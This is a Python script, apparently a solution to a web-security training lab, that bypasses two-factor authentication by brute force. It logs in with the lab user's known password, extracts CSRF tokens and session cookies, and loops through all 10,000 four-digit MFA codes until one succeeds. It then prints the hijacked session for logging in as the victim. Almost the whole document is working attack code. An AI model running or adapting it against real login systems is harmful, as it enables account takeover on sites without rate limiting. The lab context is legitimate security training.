##########################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 31/8/2023
#
# Lab: 2FA bypass using a brute-force attack
#
# Steps: 1. GET /login page and extract the session from cookie header
#           and csrf token from the body
#        2. POST /login with valid credentials, extracted session
#           and the csrf token
#        3. Obtain the new session
#        4. GET /login2 with the new session
#        5. Extract csrf token from the body of /login2
#        6. POST the mfa-code with the new session and the new
#           extracted csrf token
#        7. Repeat the process with all possbile numbers
#
##########################################################################


###########
# imports
###########
import requests
import re
import time
from colorama import Fore


#############################
# Global Variables
#############################
FAILED_CODES = []
FAILED_CODES_COUNTER = 0


###########
# Main
###########

# change this to your lab URL
url = "https://0aa300a1035fd90d8440091400c80091.web-security-academy.net"

# capture the time before brute forcing
start_time = time.time()  

print(Fore.WHITE + "[#] Brute forcing the mfa-code of " + Fore.GREEN + "carlos" + "..")

for (index, code) in enumerate(range(0, 10000)):
    try:
        # fetch /login page
        get_login_res = requests.get(url+"/login", allow_redirects=False)  
    
    except:
        # update the failed counter
        FAILED_CODES_COUNTER += 1  
        # save the failed code to try it later
        FAILED_CODES.append(code)
        continue
        
    # get session cookie
    get_login_session = get_login_res.cookies.get("session")  
        
    # extract csrf token
    get_login_token = re.findall("csrf.+value=\"(.+)\"", get_login_res.content.decode())[0]
    
    # set session cookie
    login_cookies = {
        'session': get_login_session
    }

    # set data to send via POST
    login_data = {
        'username': 'carlos',
        'password': 'montoya',
        'csrf': get_login_token
    }
    
    try:
        # login with valid credentials
        post_login_res = requests.post(url+'/login', data=login_data, cookies=login_cookies, allow_redirects=False)  
        
    except:
        # update the failed counter
        FAILED_CODES_COUNTER += 1  
        # save the failed code to try it later
        FAILED_CODES.append(code)
        continue

    # if you logged in successfully
    if post_login_res.status_code == 302:  
        # get session cookie
        post_login_session = post_login_res.cookies.get("session")  

        # set session cookie
        cookies = {
            'session': post_login_session
        }

        try:
            # fetch /login2 page
            get_login2_res = requests.get(url+"/login2", cookies=cookies, allow_redirects=False)
            
        except:
            # update the failed counter
            FAILED_CODES_COUNTER += 1  
            # save the failed code to try it later
            FAILED_CODES.append(code)
            continue
    
        # extract csrf token
        get_login2_token = re.findall("csrf.+value=\"(.+)\"", get_login2_res.content.decode())[0]  
        
        # set data to send via POST
        data = {
            "csrf": get_login2_token,
            "mfa-code": f"{code:04}"
        }
        
        try:    
            # try the mfa-code
            post_code_response = requests.post(f"{url}/login2", data, cookies=cookies, allow_redirects=False)  
          
        except:
            # update the failed counter
            FAILED_CODES_COUNTER += 1  
            # save the failed code to try it later
            FAILED_CODES.append(code)
            continue

        # if a redirect happened; means a valid code is found
        if post_code_response.status_code == 302:
            # get session cookie
            new_session = post_code_response.cookies.get("session")
            
            print(Fore.WHITE + "\n✅ Correct code: " + Fore.GREEN + f"{code:04}")
            print(Fore.WHITE + "✅ New session: " + Fore.GREEN + new_session)
            print(Fore.WHITE + "Use this session in your browser to login as " + Fore.GREEN + "carlos")
            
            break
        
        else:
            # calculate the elapsed time
            elapsed_time = int((time.time() - start_time) / 60)
            
            print(Fore.WHITE + "[*] " + Fore.YELLOW + "Elapsed: " + Fore.WHITE + str(elapsed_time) + " minutes" + " || " + Fore.RED + "Failed: " + Fore.WHITE + str(FAILED_CODES_COUNTER) + " || " +
                    f"({index}/10000)" + Fore.BLUE + f" {code:04} " + Fore.WHITE + " => " + Fore.RED + "Incorrect", end="\r", flush=True)
      
    else:
        print(Fore.RED + "Failed to login with valid credentials")
    

# calculate the elapsed time
elapsed_time = int((time.time() - start_time) / 60)

print(Fore.GREEN + "\n✅ Finished in : " + Fore.WHITE + str(elapsed_time) + " minutes")

print(Fore.RED + "\nFailed code count: " + Fore.WHITE + str(FAILED_CODES_COUNTER))
print(Fore.RED + "Failed codes: " + Fore.WHITE + "[ " + ", ".join(FAILED_CODES) + " ]")
